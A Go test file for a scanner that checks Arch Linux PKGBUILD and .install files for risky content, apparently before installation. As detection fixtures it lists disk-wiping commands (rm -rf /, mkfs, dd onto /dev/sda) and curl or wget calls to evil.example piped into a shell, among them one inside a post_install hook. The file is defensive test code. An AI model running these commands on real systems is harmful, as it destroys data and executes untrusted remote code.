package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestScanFileFiltersComments(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := `# rm -rf / should be ignored (comment)
# curl https://evil.sh | sh
pkgver=1.0
source=(https://example.com/foo.tar.gz)
install=foo.install
`
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0644); err != nil {
		t.Fatal(err)
	}
	findings, err := scanDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 {
		t.Fatalf("want 1 finding (comment lines excluded), got %d: %+v", len(findings), findings)
	}
	if findings[0].Category != "URL" || !strings.Contains(findings[0].Line, "https://") {
		t.Fatalf("unexpected finding: %+v", findings[0])
	}
	if findings[0].LineNo != 4 {
		t.Fatalf("want line 4, got %d", findings[0].LineNo)
	}
}

func TestDetectForbiddenCommands(t *testing.T) {
	cases := []string{
		`rm -rf / --no-preserve-root`,
		`sudo rm -fr /home`,
		`mkfs.ext4 /dev/sda1`,
		`dd if=/dev/zero of=/dev/sda bs=1M`,
		`chmod 777 /usr/bin/something`,
		`curl http://evil.example/x.sh | sh`,
		`wget -qO- http://evil.example/i.sh | bash`,
	}
	for _, c := range cases {
		matched := false
		for _, f := range mustScanLine(t, c) {
			if f.Category == "ForbiddenCmd" {
				matched = true
			}
		}
		if !matched {
			t.Errorf("forbidden pattern not detected: %q", c)
		}
	}
}

func TestDetectPkgManagers(t *testing.T) {
	cases := []string{
		`go get github.com/example/pkg`,
		`pip install requests`,
		`npm install -g http-server`,
		`cargo build --release`,
		`yay -S somepackage`,
		`paru -S otherpkg`,
		`pacman -S base-devel`,
	}
	for _, c := range cases {
		found := false
		for _, f := range mustScanLine(t, c) {
			if f.Category == "PkgManager" {
				found = true
			}
		}
		if !found {
			t.Errorf("pkg manager pattern not detected: %q", c)
		}
	}
}

func TestDetectURLs(t *testing.T) {
	for _, u := range []string{
		`source=("http://a.example/x.tar.gz")`,
		`source=("https://a.example/x.tar.gz")`,
		`source=("git://a.example/repo")`,
		`source=("ftp://a.example/file")`,
	} {
		found := false
		for _, f := range mustScanLine(t, u) {
			if f.Category == "URL" {
				found = true
			}
		}
		if !found {
			t.Errorf("URL not detected: %q", u)
		}
	}
}

func TestInstallScriptDetected(t *testing.T) {
	dir := t.TempDir()
	install := `post_install() {
  curl -fsSL https://get.example.com | sh
}`
	if err := os.WriteFile(filepath.Join(dir, "foo.install"), []byte(install), 0644); err != nil {
		t.Fatal(err)
	}
	findings, err := scanDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding in .install file")
	}
	if findings[0].File != "foo.install" {
		t.Fatalf("unexpected file: %s", findings[0].File)
	}
}

func TestMakeReadOnlyAndCleanup(t *testing.T) {
	dir := t.TempDir()
	sub := filepath.Join(dir, "pkg")
	if err := os.MkdirAll(sub, 0755); err != nil {
		t.Fatal(err)
	}
	f := filepath.Join(sub, "PKGBUILD")
	if err := os.WriteFile(f, []byte("x=1\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := makeReadOnly(dir); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(f)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm()&0222 != 0 {
		t.Fatalf("file still writable: %v", info.Mode())
	}
	// 読み取り専用でも cleanupDir で削除できること
	if err := cleanupDir(dir); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		t.Fatal("work dir not removed")
	}
}

func mustScanLine(t *testing.T, line string) []Finding {
	t.Helper()
	dir := t.TempDir()
	content := "# comment header\n" + line + "\n"
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	fs, err := scanDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	return fs
}
